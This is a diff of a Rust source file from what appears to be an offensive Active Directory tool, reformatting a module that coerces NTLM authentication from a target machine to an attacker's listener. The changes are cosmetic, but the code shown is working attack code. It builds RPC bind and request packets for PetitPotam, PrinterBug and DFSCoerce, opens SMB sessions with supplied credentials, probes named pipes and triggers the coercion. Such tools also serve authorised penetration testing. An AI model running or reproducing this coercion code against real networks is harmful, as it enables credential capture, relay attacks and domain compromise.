@@ -1,4 +1,4 @@
-﻿//! Authentication Coercion — Trigger NTLM authentication from a target
+//! Authentication Coercion — Trigger NTLM authentication from a target
 //! machine to an attacker-controlled listener using various RPC methods.
 //!
 //! Supported coercion techniques:
@@ -226,7 +226,10 @@ fn build_dfsnm_request(listener_path: &str) -> Vec<u8> {
         stub.push(0);
     }
     // RootShare
-    let root = "test\0".encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>();
+    let root = "test\0"
+        .encode_utf16()
+        .flat_map(|c| c.to_le_bytes())
+        .collect::<Vec<u8>>();
     let root_len = 5u32;
     stub.extend_from_slice(&root_len.to_le_bytes());
     stub.extend_from_slice(&0u32.to_le_bytes());
@@ -285,23 +288,14 @@ async fn try_coerce(
     listener_path: &str,
 ) -> CoercionAttempt {
     #[allow(clippy::type_complexity)]
-    let (pipe, uuid, version, request_builder): (
-        &str,
-        &str,
-        u16,
-        fn(&str) -> Vec<u8>,
-    ) = match method {
-        CoerceMethod::PetitPotam => (PIPE_EFSR, EFSR_UUID, 1, build_efsr_request),
-        CoerceMethod::PrinterBug => (PIPE_SPOOLSS, RPRN_UUID, 1, build_rprn_request),
-        CoerceMethod::DfsCoerce => (PIPE_NETDFS, DFSNM_UUID, 3, build_dfsnm_request),
-    };
+    let (pipe, uuid, version, request_builder): (&str, &str, u16, fn(&str) -> Vec<u8>) =
+        match method {
+            CoerceMethod::PetitPotam => (PIPE_EFSR, EFSR_UUID, 1, build_efsr_request),
+            CoerceMethod::PrinterBug => (PIPE_SPOOLSS, RPRN_UUID, 1, build_rprn_request),
+            CoerceMethod::DfsCoerce => (PIPE_NETDFS, DFSNM_UUID, 3, build_dfsnm_request),
+        };
 
-    info!(
-        "  {} Trying {} via \\\\pipe\\{}",
-        "→".cyan(),
-        method,
-        pipe
-    );
+    info!("  {} Trying {} via \\\\pipe\\{}", "→".cyan(), method, pipe);
 
     // Step 1: RPC Bind
     let bind_pdu = build_rpc_bind(uuid, version);
@@ -376,7 +370,7 @@ async fn try_coerce(
                 | 0x00000033  // ERROR_REM_NOT_LIST
                 | 0x00000040  // ERROR_NETNAME_DELETED
                 | 0x0000006D  // ERROR_BAD_DEV_TYPE
-                | 0x00000057  // ERROR_INVALID_PARAMETER
+                | 0x00000057 // ERROR_INVALID_PARAMETER
             );
 
             if coercion_triggered {
@@ -517,13 +511,7 @@ fn build_webdav_listener_path(listener: &str, port: u16) -> String {
 pub async fn scan(config: &HuntConfig, target: &str) -> Result<Vec<(CoerceMethod, bool)>> {
     info!("Coerce scan: checking pipe availability on {}", target);
 
-    let smb = SmbSession::connect(
-        target,
-        &config.domain,
-        &config.username,
-        &config.secret,
-    )
-    .await?;
+    let smb = SmbSession::connect(target, &config.domain, &config.username, &config.secret).await?;
 
     let results = check_pipe_availability(&smb).await;
 
@@ -533,7 +521,16 @@ pub async fn scan(config: &HuntConfig, target: &str) -> Result<Vec<(CoerceMethod
         } else {
             "✗".red()
         };
-        info!("  {} {} — pipe {}", icon, method, if *available { "accessible" } else { "not found" });
+        info!(
+            "  {} {} — pipe {}",
+            icon,
+            method,
+            if *available {
+                "accessible"
+            } else {
+                "not found"
+            }
+        );
     }
 
     Ok(results)
@@ -611,10 +608,7 @@ pub async fn run(config: &HuntConfig, cc: &CoerceConfig) -> Result<CoerceResult>
         ));
     }
 
-    info!(
-        "  Target:   {}",
-        cc.target.bold()
-    );
+    info!("  Target:   {}", cc.target.bold());
     info!(
         "  Listener: {} (port {})",
         cc.listener.cyan(),
@@ -622,27 +616,16 @@ pub async fn run(config: &HuntConfig, cc: &CoerceConfig) -> Result<CoerceResult>
     );
 
     // Step 1: Establish SMB session to target
-    let smb = SmbSession::connect(
-        &cc.target,
-        &config.domain,
-        &config.username,
-        &config.secret,
-    )
-    .await
-    .map_err(|e| {
-        OverthroneError::Smb(format!(
-            "Cannot connect to target '{}': {e}",
-            cc.target
-        ))
-    })?;
+    let smb = SmbSession::connect(&cc.target, &config.domain, &config.username, &config.secret)
+        .await
+        .map_err(|e| {
+            OverthroneError::Smb(format!("Cannot connect to target '{}': {e}", cc.target))
+        })?;
 
     info!("  {} SMB session established", "✓".green());
 
     // Step 2: Build listener path
-    let listener_path = build_listener_path(
-        &cc.listener,
-        cc.listener_path.as_deref(),
-    );
+    let listener_path = build_listener_path(&cc.listener, cc.listener_path.as_deref());
     info!("  Listener UNC: {}", listener_path.yellow());
 
     // Step 3: Determine which methods to try
@@ -759,7 +742,7 @@ mod tests {
     fn test_rpc_bind_construction() {
         let bind = build_rpc_bind(EFSR_UUID, 1);
         assert!(bind.len() > 20);
-        assert_eq!(bind[0], 5);  // RPC version major
+        assert_eq!(bind[0], 5); // RPC version major
         assert_eq!(bind[2], 11); // Bind packet type
     }
 
@@ -767,8 +750,8 @@ mod tests {
     fn test_rpc_request_construction() {
         let req = build_rpc_request(0, &[0x41, 0x42, 0x43, 0x44]);
         assert!(req.len() >= 28);
-        assert_eq!(req[0], 5);  // RPC version major
-        assert_eq!(req[2], 0);  // Request packet type
+        assert_eq!(req[0], 5); // RPC version major
+        assert_eq!(req[2], 0); // Request packet type
         // Opnum at offset 22-23
         assert_eq!(req[22], 0);
         assert_eq!(req[23], 0);
@@ -776,17 +759,8 @@ mod tests {
 
     #[test]
     fn test_coerce_method_display() {
-        assert_eq!(
-            CoerceMethod::PetitPotam.to_string(),
-            "PetitPotam (MS-EFSR)"
-        );
-        assert_eq!(
-            CoerceMethod::PrinterBug.to_string(),
-            "PrinterBug (MS-RPRN)"
-        );
-        assert_eq!(
-            CoerceMethod::DfsCoerce.to_string(),
-            "DFSCoerce (MS-DFSNM)"
-        );
+        assert_eq!(CoerceMethod::PetitPotam.to_string(), "PetitPotam (MS-EFSR)");
+        assert_eq!(CoerceMethod::PrinterBug.to_string(), "PrinterBug (MS-RPRN)");
+        assert_eq!(CoerceMethod::DfsCoerce.to_string(), "DFSCoerce (MS-DFSNM)");
     }
 }
